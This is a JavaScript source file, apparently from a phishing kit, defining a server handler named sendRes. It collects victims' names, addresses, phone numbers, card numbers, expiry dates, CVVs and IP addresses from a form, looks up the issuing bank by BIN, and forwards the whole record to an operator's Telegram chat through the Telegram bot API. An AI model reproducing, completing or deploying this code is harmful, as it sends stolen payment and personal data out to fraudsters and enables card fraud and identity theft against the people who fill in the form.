const axios = require("axios");

const sendRes = async (req, res) => {
    let {
        firstname,
        lastname,
        say,
        mei,
        telephone,
        postcode,
        address1,
        address2,
        address3,
        address4,
        ccnum,
        ccexp,
        cvv,
        ip,
        telegramId,
        bin
    } = req.body;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, "");
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }

    const response = await axios.get(`https://lookup.binlist.net/${bin}`);
    let bankName;

    if (response.data.bank) {
        bankName = response.data.bank.name.name;
    }

    const binList = `${bin} |${postcode} | ${bankName}`;
    var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nSay: ${say}\nMei: ${mei}\nAddress: ${address1}, ${address2}, ${address3}, ${address4}\nPost Code: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;

    await axios
        .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
                chat_id: telegramId,
                text: `Kurone:\n${originalText}`,
                parse_mode: "Markdown",
            }
        )
        .catch((e) => {
            console.log(e);
        });
    res.sendStatus(200);
};

module.exports = {
    sendRes,
};